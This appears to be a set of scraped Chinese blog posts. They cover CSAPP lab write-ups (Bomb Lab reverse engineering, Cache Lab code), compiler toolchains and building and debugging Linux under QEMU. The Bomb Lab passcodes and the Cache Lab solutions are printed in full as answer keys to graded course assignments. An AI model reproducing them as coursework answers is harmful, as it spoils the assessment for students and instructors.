\u0026lt;+59\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401282 \u0026lt;+64\u0026gt;: mov edi,0x402438 0x0000000000401287 \u0026lt;+69\u0026gt;: call 0x400b10 \u0026lt;puts@plt\u0026gt; 0x000000000040128c \u0026lt;+74\u0026gt;: call 0x4015c4 \u0026lt;phase_defused\u0026gt; 0x0000000000401291 \u0026lt;+79\u0026gt;: pop rbx 0x0000000000401292 \u0026lt;+80\u0026gt;: ret 其流程为：\n读取一个用户输入的数字 判断输入数字是否满足：input_number - 1 \u0026lt;= 1000 判断是否满足：fun7(\u0026amp;n1, input_number) == 2 fun7反汇编如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 0x0000000000401204 \u0026lt;+0\u0026gt;: sub rsp,0x8 0x0000000000401208 \u0026lt;+4\u0026gt;: test rdi,rdi 0x000000000040120b \u0026lt;+7\u0026gt;: je 0x401238 \u0026lt;fun7+52\u0026gt; 0x000000000040120d \u0026lt;+9\u0026gt;: mov edx,DWORD PTR [rdi] 0x000000000040120f \u0026lt;+11\u0026gt;: cmp edx,esi 0x0000000000401211 \u0026lt;+13\u0026gt;: jle 0x401220 \u0026lt;fun7+28\u0026gt; 0x0000000000401213 \u0026lt;+15\u0026gt;: mov rdi,QWORD PTR [rdi+0x8] 0x0000000000401217 \u0026lt;+19\u0026gt;: call 0x401204 \u0026lt;fun7\u0026gt; 0x000000000040121c \u0026lt;+24\u0026gt;: add eax,eax 0x000000000040121e \u0026lt;+26\u0026gt;: jmp 0x40123d \u0026lt;fun7+57\u0026gt; 0x0000000000401220 \u0026lt;+28\u0026gt;: mov eax,0x0 0x0000000000401225 \u0026lt;+33\u0026gt;: cmp edx,esi 0x0000000000401227 \u0026lt;+35\u0026gt;: je 0x40123d \u0026lt;fun7+57\u0026gt; 0x0000000000401229 \u0026lt;+37\u0026gt;: mov rdi,QWORD PTR [rdi+0x10] 0x000000000040122d \u0026lt;+41\u0026gt;: call 0x401204 \u0026lt;fun7\u0026gt; 0x0000000000401232 \u0026lt;+46\u0026gt;: lea eax,[rax+rax*1+0x1] 0x0000000000401236 \u0026lt;+50\u0026gt;: jmp 0x40123d \u0026lt;fun7+57\u0026gt; 0x0000000000401238 \u0026lt;+52\u0026gt;: mov eax,0xffffffff 0x000000000040123d \u0026lt;+57\u0026gt;: add rsp,0x8 0x0000000000401241 \u0026lt;+61\u0026gt;: ret n1为一个树结点：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 pwndbg\u0026gt; x/60 \u0026amp;n1 0x6030f0 \u0026lt;n1\u0026gt;: 0x0000000000000024 0x0000000000603110 0x603100 \u0026lt;n1+16\u0026gt;: 0x0000000000603130 0x0000000000000000 0x603110 \u0026lt;n21\u0026gt;: 0x0000000000000008 0x0000000000603190 0x603120 \u0026lt;n21+16\u0026gt;: 0x0000000000603150 0x0000000000000000 0x603130 \u0026lt;n22\u0026gt;: 0x0000000000000032 0x0000000000603170 0x603140 \u0026lt;n22+16\u0026gt;: 0x00000000006031b0 0x0000000000000000 0x603150 \u0026lt;n32\u0026gt;: 0x0000000000000016 0x0000000000603270 0x603160 \u0026lt;n32+16\u0026gt;: 0x0000000000603230 0x0000000000000000 0x603170 \u0026lt;n33\u0026gt;: 0x000000000000002d 0x00000000006031d0 0x603180 \u0026lt;n33+16\u0026gt;: 0x0000000000603290 0x0000000000000000 0x603190 \u0026lt;n31\u0026gt;: 0x0000000000000006 0x00000000006031f0 0x6031a0 \u0026lt;n31+16\u0026gt;: 0x0000000000603250 0x0000000000000000 0x6031b0 \u0026lt;n34\u0026gt;: 0x000000000000006b 0x0000000000603210 0x6031c0 \u0026lt;n34+16\u0026gt;: 0x00000000006032b0 0x0000000000000000 0x6031d0 \u0026lt;n45\u0026gt;: 0x0000000000000028 0x0000000000000000 0x6031e0 \u0026lt;n45+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x6031f0 \u0026lt;n41\u0026gt;: 0x0000000000000001 0x0000000000000000 0x603200 \u0026lt;n41+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603210 \u0026lt;n47\u0026gt;: 0x0000000000000063 0x0000000000000000 0x603220 \u0026lt;n47+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603230 \u0026lt;n44\u0026gt;: 0x0000000000000023 0x0000000000000000 0x603240 \u0026lt;n44+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603250 \u0026lt;n42\u0026gt;: 0x0000000000000007 0x0000000000000000 0x603260 \u0026lt;n42+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603270 \u0026lt;n43\u0026gt;: 0x0000000000000014 0x0000000000000000 0x603280 \u0026lt;n43+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603290 \u0026lt;n46\u0026gt;: 0x000000000000002f 0x0000000000000000 0x6032a0 \u0026lt;n46+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x6032b0 \u0026lt;n48\u0026gt;: 0x00000000000003e9 0x0000000000000000 0x6032c0 \u0026lt;n48+16\u0026gt;: 0x0000000000000000 0x0000000000000000 fun7翻译为C语言代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int fun7(TreeNode* node, int num) { if(node == NULL) return -1; else { if(node-\u0026gt;val \u0026lt;= num) { if(node-\u0026gt;Val == num) return 0; else return 2 * fun7(node-\u0026gt;right, num) + 1; } else return 2 * fun7(node-\u0026gt;left, num); } } 明显只有从return 2 * fun7(node-\u0026gt;left, num);才能返回2这个数字\n由此逆推可得，最终解为22\necho \u0026quot;22\u0026quot; \u0026gt;\u0026gt; passcodes\n完整答案：\n1 2 3 4 5 6 7 8 ▶ cat passcodes Border relations with Canada have never been better. 1 2 4 8 16 32 1 311 7 0 DrEvil ionefg 4 3 2 1 6 5 22 1 2 3 4 5 6 7 8 9 10 11 12 ▶ ./bomb passcodes Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Phase 1 defused. How about the next one? That\u0026#39;s number 2. Keep going! Halfway there! So you got that one. Try this one. Good work! On to the next... Curses, you\u0026#39;ve found the secret phase! But finding it and solving it are quite different... Wow! You\u0026#39;ve defused the secret stage! Congratulations! You\u0026#39;ve defused the bomb! Attack Lab Attack Lab是CSAPP2e中的Buffer Lab的更新，所以可以忽略后者\nCode Injection ctarget用于缓冲区溢出攻击 rtarget用于ROP攻击 hex2raw用于将16禁止转字符串 farm.c cookie.txt ctarget和rtarget需要参数-q取消链接服务器，参数-i用于输入文件：\n1 2 3 4 5 ▶ ./ctarget -h Usage: [-hq] ./ctarget -i \u0026lt;infile\u0026gt; -h Print help information -q Don\u0026#39;t submit result to server -i \u0026lt;infile\u0026gt; Input file 在我的本地环境运行时会直接segmentation fault，经查原因为：\n1 2 *RSP 0x5561d668 ◂— 0 ► 0x7ffff7df7150 \u0026lt;__vfprintf_internal+160\u0026gt; movaps xmmword ptr [rsp + 0x10], xmm1 中，xmmword ptr [rsp + 0x10]不满足movaps指令要求的16字节对齐\n0x1 0x2 0x3 ROP 0x4 0x5 Architecture Lab Cache Lab README：http://csapp.cs.cmu.edu/3e/README-cachelab\n参考：Cache Lab Implementation and Blocking\nPart A. Building a cache simulator 在csim.c中编码，实现csim-ref相同的功能。\n实现代码：csim.c：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 #include \u0026#34;cachelab.h\u0026#34; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;getopt.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;limits.h\u0026gt; // global parameters int s, E, b, S; char filename[1000]; // emulation status counts int hit_count, miss_count, eviction_count; typedef struct { int valid_bit; int tag; int lru_stamp; // LRU时间戳 char* block; // 数据块，对于题目来说实际上并不需要，此处仅为了模拟真实cache }cache_line, *cache_asso, **cache; cache _cache_ = NULL; // cache的(二级索引形式的)二维数组 // 打印 helper 内容的函数，-h 命令使用 void printUsage() { printf(\u0026#34;Usage: ./csim-ref [-hv] -s \u0026lt;num\u0026gt; -E \u0026lt;num\u0026gt; -b \u0026lt;num\u0026gt; -t \u0026lt;file\u0026gt;\\n\u0026#34; \u0026#34;Options:\\n\u0026#34; \u0026#34; -h Print this help message.\\n\u0026#34; \u0026#34; -v Optional verbose flag.\\n\u0026#34; \u0026#34; -s \u0026lt;num\u0026gt; Number of set index bits.\\n\u0026#34; \u0026#34; -E \u0026lt;num\u0026gt; Number of lines per set.\\n\u0026#34; \u0026#34; -b \u0026lt;num\u0026gt; Number of block offset bits.\\n\u0026#34; \u0026#34; -t \u0026lt;file\u0026gt; Trace file.\\n\\n\u0026#34; \u0026#34;Examples:\\n\u0026#34; \u0026#34; linux\u0026gt; ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\\n\u0026#34; \u0026#34; linux\u0026gt; ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\\n\u0026#34;); } // 初始化cache void initCache() { _cache_ = (cache)malloc(sizeof(cache_asso) * S); for(int i = 0; i \u0026lt; S; ++i) { _cache_[i] = (cache_asso)malloc(sizeof(cache_line) * E); for(int j = 0; j \u0026lt; E; ++j) { _cache_[i][j].valid_bit = 0; _cache_[i][j].tag = -1; _cache_[i][j].lru_stamp = -1; _cache_[i][j].block = NULL; } } } void update(unsigned int address) { int max_stamp = INT_MIN; int max_stamp_index = -1; // 由内存地址求组索引与目标tag值 int set_index = (address \u0026gt;\u0026gt; b) \u0026amp; ((-1U) \u0026gt;\u0026gt; (64 - s)); int tag_value = address \u0026gt;\u0026gt; (b + s); // 在当前组中搜索 for(int i = 0; i \u0026lt; E; ++i) { // tag相同，cache hit if(_cache_[set_index][i].tag == tag_value) { _cache_[set_index][i].lru_stamp = 0; hit_count++; return; } } // 当前组在hit后，处理其中空行 for(int i = 0; i \u0026lt; E; ++i) { if(_cache_[set_index][i].valid_bit == 0) { _cache_[set_index][i].valid_bit = 1; _cache_[set_index][i].lru_stamp = 0; _cache_[set_index][i].tag = tag_value; miss_count++; return; } } // 既没有hit，也没有空行，则触发替换 eviction_count++; miss_count++; for(int i = 0; i \u0026lt; E; ++i) { // LRU擂台 if(_cache_[set_index][i].lru_stamp \u0026gt; max_stamp) { max_stamp = _cache_[set_index][i].lru_stamp; max_stamp_index = i; } } // 挑选出LRU后的最坏的cache_line提供给tag_value对应的内存 _cache_[set_index][max_stamp_index].tag = tag_value; _cache_[set_index][max_stamp_index].lru_stamp = 0; return; } // 每一轮全体时间戳都要+1 void updateStamp() { for(int i = 0; i \u0026lt; S; ++i) for(int j = 0; j \u0026lt; E; ++j) if(_cache_[i][j].valid_bit == 1) ++_cache_[i][j].lru_stamp; } void parseTrace() { FILE* fp = fopen(filename, \u0026#34;r\u0026#34;); if(fp == NULL) { printf(\u0026#34;open error\u0026#34;); exit(-1); } // 解析输入内容 char operator; // I:忽略 L:load M:modify S:store unsigned int address; // 内存地址 int size; // 数据大小 while( fscanf(fp, \u0026#34; %c %xu,%d\\n\u0026#34;, \u0026amp;operator, \u0026amp;address, \u0026amp;size) \u0026gt; 0 ) { switch (operator) { case \u0026#39;I\u0026#39;: continue; case \u0026#39;L\u0026#39;: // load访问一次 update(address); break; case \u0026#39;M\u0026#39;: // modify若miss，则还需store一次 update(address); case \u0026#39;S\u0026#39;: // store访问一次 update(address); } updateStamp(); // 每轮更新时间戳 } // 关文件，free内存 fclose(fp); for(int i = 0; i \u0026lt; S; ++i) free(_cache_[i]); free(_cache_); } int main(int argc, char *argv[]) { hit_count = miss_count = eviction_count = 0; int opt; while( -1 != (opt = (getopt(argc, argv, \u0026#34;hvs:E:b:t:\u0026#34;))) ) { switch (opt) { case \u0026#39;h\u0026#39;: printUsage(); return 0; case \u0026#39;v\u0026#39;: break; case \u0026#39;s\u0026#39;: s = atoi(optarg); break; case \u0026#39;E\u0026#39;: E = atoi(optarg); break; case \u0026#39;b\u0026#39;: b = atoi(optarg); break; case \u0026#39;t\u0026#39;: strcpy(filename, optarg); break; default: printUsage(); return 0; } } S = 1 \u0026lt;\u0026lt; s; initCache(); // 初始化cache parseTrace(); // 更新最终的三个参数 printSummary(hit_count, miss_count, eviction_count); return 0; } 编译：\n1 gcc csim.c cachelab.c -o csim 结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ▶ ./test-csim Your simulator Reference simulator Points (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27 TEST_CSIM_RESULTS=27 Part B. Optimizing matrix transpose Part B则是编写cache友好型程序，核心在于利用好程序的局部性，划分内存区域的访问顺序，尽量连续访问被cache缓存的数据。具体任务是实现矩阵转置。\n对应的，我们需要计算给定的cache大小，以其为单位，分批次将同样大小的内存数据放入cache并完整处理完毕，以提高cache效率。ZiYang-Xie大佬的图很形象，蓝色箭头原地转置，红色箭头分块交换。\ntrans.c:transpose_submit具体实现如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void transpose_submit(int M, int N, int A[N][M], int B[M][N]) { // S = 5, E = 1, B = 5 if(M == 32 \u0026amp;\u0026amp; N == 32) { // 该cache最多可读入32x32矩阵中的8行数据，故以每块8x8的大小分割并转置存放到另一个矩阵中 for(int i = 0; i \u0026lt; N; i += 8) for(int j = 0; j \u0026lt; M; j += 8) { // 8x8块内转置 for(int k = i; k \u0026lt; i + 8; ++k) { int tmp1 = A[k][j]; int tmp2 = A[k][j+1]; int tmp3 = A[k][j+2]; int tmp4 = A[k][j+3]; int tmp5 = A[k][j+4]; int tmp6 = A[k][j+5]; int tmp7 = A[k][j+6]; int tmp8 = A[k][j+7]; B[j][k] = tmp1; B[j+1][k] = tmp2; B[j+2][k] = tmp3; B[j+3][k] = tmp4; B[j+4][k] = tmp5; B[j+5][k] = tmp6; B[j+6][k] = tmp7; B[j+7][k] = tmp8; } } } else if (M == 64 \u0026amp;\u0026amp; N == 64) { // 该cache最多可读入64x64矩阵中的4行数据，故以每块4x4的大小分割并转置存放到另一个矩阵中 for (int i = 0; i \u0026lt; N; i += 4) for (int j = 0; j \u0026lt; M; j += 4) { for(int k = i; k \u0026lt; i + 4; k += 2) { int tmp1 = A[k][j]; int tmp2 = A[k][j+1]; int tmp3 = A[k][j+2]; int tmp4 = A[k][j+3]; int tmp5 = A[k+1][j]; int tmp6 = A[k+1][j+1]; int tmp7 = A[k+1][j+2]; int tmp8 = A[k+1][j+3]; B[j][k] = tmp1; B[j+1][k] = tmp2; B[j+2][k] = tmp3; B[j+3][k] = tmp4; B[j][k+1] = tmp5; B[j+1][k+1] = tmp6; B[j+2][k+1] = tmp7; B[j+3][k+1] = tmp8; } } } else if (M == 61 \u0026amp;\u0026amp; N == 67) { // 对于61x67的矩阵，16x16可以满足miss数小于2k的要求，而17x17是最优选择，miss数为1950 for (int i = 0; i \u0026lt; N; i += 17) { for (int j = 0; j \u0026lt; M; j += 17) { for(int k = i; k \u0026lt; i + 17 \u0026amp;\u0026amp; k \u0026lt; N; k ++) for(int l = j; l \u0026lt; j + 17 \u0026amp;\u0026amp; l \u0026lt; M; l++) B[l][k] = A[k][l]; } } } return; } 测试结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ▶ ./driver.py Part A: Testing cache simulator Running ./test-csim Your simulator Reference simulator Points (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27 Part B: Testing transpose function Running ./test-trans -M 32 -N 32 Running ./test-trans -M 64 -N 64 Running ./test-trans -M 61 -N 67 Cache Lab summary: Points Max pts Misses Csim correctness 27.0 27 Trans perf 32x32 8.0 8 288 Trans perf 64x64 3.8 8 1668 Trans perf 61x67 10.0 10 1951 Total points 48.8 53 Shell Lab Malloc Lab Proxy Lab ","date":"2022-08-19T17:06:58+08:00","image":"https://s2.loli.net/2022/08/24/HhMzuB9lRFsCvy2.png","permalink":"https://cerr.cc/post/csapp-lab-writeup/","title":"CSAPP Lab WriteUp"},{"content":"编译工具链 此前疑惑的一个问题是，一套编译工具链究竟包含了些什么东西？当我们使用包管理器一键安装编译工具链时，所安装的程序、数据、文档被分散在了根文件系统的各个位置，难以让我们直接一窥究竟。好在老生常谈的buildroot又为我们解决了这个问题，（当然，从网上下载一份编译工具链也能达到相同的效果）。取一份buildroot构建完成的编译工具链瞅瞅，路径位于buildroot/output/host：\n1 2 ▶ ls host bin etc include lib lib64 libexec man sbin share usr var x86_64-buildroot-linux-uclibc 其中的直接编译工具部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ▶ ls bin | grep \u0026#34;x86_64-linux\u0026#34; | grep -v \u0026#34;br_real\u0026#34; x86_64-linux-addr2line\t# convert addresses into line number/file name pairs x86_64-linux-ar\t# create, modify, and extract from archives x86_64-linux-as\t# the portable GNU assembler x86_64-linux-c++filt\t# demangle C++ and Java symbols x86_64-linux-cc x86_64-linux-cpp x86_64-linux-elfedit\t# update the ELF header of ELF files x86_64-linux-gcc x86_64-linux-gcc-11.3.0 x86_64-linux-gcc-ar x86_64-linux-gcc-nm\t# list symbols from object files x86_64-linux-gcc-ranlib\t# generate an index to an archive x86_64-linux-gcov\t# print code coverage information x86_64-linux-gcov-dump\t# print coverage file contents x86_64-linux-gcov-tool\t# offline tool to handle gcda counts x86_64-linux-gprof\t# display call graph profile data x86_64-linux-ld x86_64-linux-ld.bfd x86_64-linux-ldconfig\t# configure Dynamic Linker Run Time Bindings x86_64-linux-ldd\t# print shared object dependencies x86_64-linux-lto-dump\t# tool for dumping LTO object files x86_64-linux-nm x86_64-linux-objcopy\t# copies a binary file, possibly transforming it in the process x86_64-linux-objdump\t# display information from object files x86_64-linux-ranlib x86_64-linux-readelf\t# display information about ELF files x86_64-linux-size\t# list section sizes and total size of binary files x86_64-linux-strings\t# print the sequences of printable characters in files x86_64-linux-strip\t# discard symbols and other data from object files 使用buildroot构建任意编译工具链 buildroot对那些平台有默认配置呢：\n这个数量的输出项怎么看覆盖都很全面呀。\n那么两行命令即可得到特定平台的编译工具链了（以qemu_aarch64_virt为例）：\n1 2 make qemu_aarch64_virt_defconfig make toolchain 来到buildroot/output/host中取货即可。\nbinutils GNU assembler, linker and binary utilities. The programs in this package are used to assemble, link and manipulate binary and object files. They may be used in conjunction with a compiler and various libraries to build programs.\n那么binutils包中包含了哪些路径下的哪些内容呢？\n使用apt-file工具查看下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ▶ sudo apt install apt-file ▶ apt-file list binutils binutils: /usr/bin/addr2line binutils: /usr/bin/ar binutils: /usr/bin/as binutils: /usr/bin/c++filt binutils: /usr/bin/dwp binutils: /usr/bin/elfedit binutils: /usr/bin/gold binutils: /usr/bin/gprof binutils: /usr/bin/ld binutils: /usr/bin/ld.bfd binutils: /usr/bin/ld.gold binutils: /usr/bin/nm binutils: /usr/bin/objcopy binutils: /usr/bin/objdump binutils: /usr/bin/ranlib binutils: /usr/bin/readelf binutils: /usr/bin/size binutils: /usr/bin/strings binutils: /usr/bin/strip binutils: /usr/lib/compat-ld/ld binutils: /usr/lib/gold-ld/ld binutils: /usr/share/bug/binutils/presubj binutils: /usr/share/doc/binutils/changelog.Debian.gz binutils: /usr/share/doc/binutils/copyright binutils: /usr/share/lintian/overrides/binutils configure make 官方文档：https://www.gnu.org/software/make/manual/html_node/index.html\n一页版ASCII文档，方便Ctrl + F速查：https://www.gnu.org/software/make/manual/make.txt\nmake通过makefile中定义的各个文件的依赖关系，以及文件系统中所标记的文件修改时间，判断哪些文件是需要通过特定命令重新构建的。由此达到自动化构建的目的。\ncmake gcc 官方文档：https://gcc.gnu.org/onlinedocs/\n快速查询文档：man gcc。对应的是gcc的本地单页文档。\n由于文档太长，没有在线的单页版，所以如需在线查询文档需借助Google，例如查询-march编译选项的含义：\n注意不能搜索-march site:gcc.gnu.org，-对于Google来说是“不包含该关键词”的含义\n","date":"2022-08-08T14:34:10+08:00","image":"https://s2.loli.net/2022/08/09/FTvgEfriYsZ2a9L.png","permalink":"https://cerr.cc/post/zkv%E7%9A%84cc-%E6%9E%84%E5%BB%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/","title":"ZKV的C、C++构建系统学习之路"},{"content":"环境准备 QEMU 的手动构建 获取QEMU源码：\n1 2 3 4 git clone https://gitlab.com/qemu-project/qemu.git cd qemu git submodule init git submodule update --recursive 本次使用x86_64内核的情况下，configure配置如下：\n1 ./configure --target-list=x86_64-softmmu --enable-debug 编译并安装：\n1 2 make -j`nproc` sudo make install 使用buildroot一键构建rootfs+kernel buildroot自动构建过程若出现网络不畅，自备梯子，并设定shell变量all_proxy、http_proxy、https_proxy用于代理wget、curl等工具即可。参见：https://cerr.cc/post/fuck-the-great-fire-wall/\n1 2 3 4 git clone https://git.buildroot.net/buildroot cd buildroot make qemu_x86_64_defconfig make linux-menuconfig 使用 / 搜索 DEBUG_INFO 符号（即配置文件中的CONFIG_DEBUG_INFO符号） 设定路径与依赖，将其打开。\n以同样的方式再将 GDB_SCRIPT 打开、RANDOMIZE_BASE 关闭。\n此后即可直接make构建。\n1 2 3 4 5 make # 编译构建中…… # ☕️、☕️、☕️…… # 编译构建完成 output/images/start-qemu.sh 测试是否正常启动：（上一步若关闭了RANDOMIZE_BASE，则无需向kernel传递nokaslr参数）\n1 2 3 4 5 6 cd output/images qemu-system-x86_64 -M pc -kernel bzImage \\ -drive file=rootfs.ext2,if=virtio,format=raw \\ -append \u0026#34;rootwait root=/dev/vda console=tty1 console=ttyS0 nokaslr\u0026#34; \\ -net nic,model=virtio -net user \\ -nographic -s -S -nographic 全部信息输出至host stdio 若否，而是使用-serial stdio，则只会将guest的串口数据输出至host stdio，其余则会输出至启动的vncserver -s shorthand for -gdb tcp::1234 -S freeze CPU at startup (use \u0026lsquo;c\u0026rsquo; to start execution) 此时于另一个tty、pts：\n1 2 3 4 sudo gdb -ex \u0026#34;file ../build/linux-5.15.18/vmlinux\u0026#34; \\ -ex \u0026#34;target remote :1234\u0026#34; pwndbg\u0026gt; b start_kernel pwndbg\u0026gt; c 确认成功断下执行流即可。\n手动构建kernel+initramfs 若不想借助自动化工具buildroot传达旨意，而是要亲自指挥亲自部署，记录如下：\n载入x86_64默认config：\n1 make x86_64_defconfig 使用Linux提供的脚本一键启用DEBUG_KERNEL、DEBUG_INFO、GDB_SCRIPTS，关闭RANDOMIZE_BASE\n1 ./scripts/config --file .config -e DEBUG_KERNEL -e DEBUG_INFO -e GDB_SCRIPTS -d RANDOMIZE_BASE 开始编译：\n1 make -j`nproc` 得到：Kernel: arch/x86/boot/bzImage is ready\n先来看看单kernel直接传递给qemu启动会怎样：\n1 qemu-system-x86_64 -kernel arch/x86_64/boot/bzImage -nographic -append \u0026#34;console=ttyS0\u0026#34; 得到：\n1 ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0) ]--- 没有rootfs的情况下kernel初始化完成后会直接panic。\n那么接下来制作initramfs即可：\n1 mkinitramfs -o ramdisk.img 提供足够内存后启动：\n1 qemu-system-x86_64 -m 512 -kernel arch/x86_64/boot/bzImage -nographic -append \u0026#34;console=ttyS0\u0026#34; -initrd ramdisk.img 得到shell即成功。\n巧合的是，就在我执行完如上命令进入shell后，惊觉Linux居然已经6.0.0了😱。经查正是今天的新闻。\n试图调试 沿用上述手动挡的构建方案，qemu启动时关闭kaslr（编译时若关闭了RANDOMIZE_BASE，则无需向kernel传递nokaslr参数）：\n1 2 3 4 5 6 qemu-system-x86_64 -m 512 \\ -kernel arch/x86_64/boot/bzImage \\ -append \u0026#34;console=ttyS0 nokaslr\u0026#34; \\ -initrd ramdisk.img \\ -nographic \\ -s -S 此时于另一个tty、pts：\n1 2 3 echo \u0026#34;add-auto-load-safe-path /home/zkv/Laboratory/linux/scripts/gdb/vmlinux-gdb.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit echo \u0026#34;set auto-load safe-path /\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gdb vmlinux -ex \u0026#34;target remote :1234\u0026#34; 关于对gdb调试的支持，内核所提供的文档如下：\nhttps://www.kernel.org/doc/html/latest/dev-tools/gdb-kernel-debugging.html\n内核启动 内核初始化主函数：init/main.c:start_kernel\n1 2 pwndbg\u0026gt; hb start_kernel pwndbg\u0026gt; c 第一次向console打印内容：\n1 2 3 pwndbg\u0026gt; hb console_init pwndbg\u0026gt; c pwndbg\u0026gt; until 可得：\n1 2 [ 0.000000] Console: colour VGA+ 80x25 [ 0.000000] printk: console [ttyS0] enabled 内核主线程的终点：\n1 2 3 4 5 6 7 8 In file: /home/zkv/Laboratory/linux/kernel/sched/idle.c 395 void cpu_startup_entry(enum cpuhp_state state) 396 { 397 arch_cpu_idle_prepare(); 398 cpuhp_online_idle(state); 399 while (1) ► 400 do_idle(); 401 } 进入do_idle让出CPU，没有任务时将CPU交给用户态程序使用，否则将CPU重新调度给内核线程自己。while(1)无限循环该操作。\nkernel/sched/idle.c的内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 /* * Generic idle loop implementation * * Called with polling cleared. */ static void do_idle(void) { int cpu = smp_processor_id(); /* * Check if we need to update blocked load */ nohz_run_idle_balance(cpu); /* * If the arch has a polling bit, we maintain an invariant: * * Our polling bit is clear if we\u0026#39;re not scheduled (i.e. if rq-\u0026gt;curr != * rq-\u0026gt;idle). This means that, if rq-\u0026gt;idle has the polling bit set, * then setting need_resched is guaranteed to cause the CPU to * reschedule. */ __current_set_polling(); tick_nohz_idle_enter(); while (!need_resched()) { rmb(); local_irq_disable(); if (cpu_is_offline(cpu)) { tick_nohz_idle_stop_tick(); cpuhp_report_idle_dead(); arch_cpu_idle_dead(); } arch_cpu_idle_enter(); rcu_nocb_flush_deferred_wakeup(); /* * In poll mode we reenable interrupts and spin. Also if we * detected in the wakeup from idle path that the tick * broadcast device expired for us, we don\u0026#39;t want to go deep * idle as we know that the IPI is going to arrive right away. */ if (cpu_idle_force_poll || tick_check_broadcast_expired()) { tick_nohz_idle_restart_tick(); cpu_idle_poll(); } else { cpuidle_idle_call(); } arch_cpu_idle_exit(); } /* * Since we fell out of the loop above, we know TIF_NEED_RESCHED must * be set, propagate it into PREEMPT_NEED_RESCHED. * * This is required because for polling idle loops we will not have had * an IPI to fold the state for us. */ preempt_set_need_resched(); tick_nohz_idle_exit(); __current_clr_polling(); /* * We promise to call sched_ttwu_pending() and reschedule if * need_resched() is set while polling is set. That means that clearing * polling needs to be visible before doing these things. */ smp_mb__after_atomic(); /* * RCU relies on this call to be done outside of an RCU read-side * critical section. */ flush_smp_call_function_queue(); schedule_idle(); // 这里会将CPU交由用户态程序使用 if (unlikely(klp_patch_pending(current))) klp_update_patch_state(current); } 系统调用 静态搜寻 动态调试系统调用代码之前，不妨先来找到内核系统调用的静态代码位置。Linux Kernel使用SYSCALL_DEFINE[N]宏来定义系统调用入口，其原型位于include/linux/syscalls.h，其中会调用特定系统调用的实现函数。所以，我们使用如下命令可以帮助快速筛选想要动态调试的系统调用入口所在位置：\n1 grep -rn \u0026#34;SYSCALL_DEFINE\u0026#34; 举例来讲，接下来我想要对与open这一系统调用的具体实现一探究竟，就应当：\n1 2 3 4 ▶ grep -rn \u0026#34;SYSCALL_DEFINE\u0026#34; | grep open ...... fs/open.c:1331:SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode) ...... 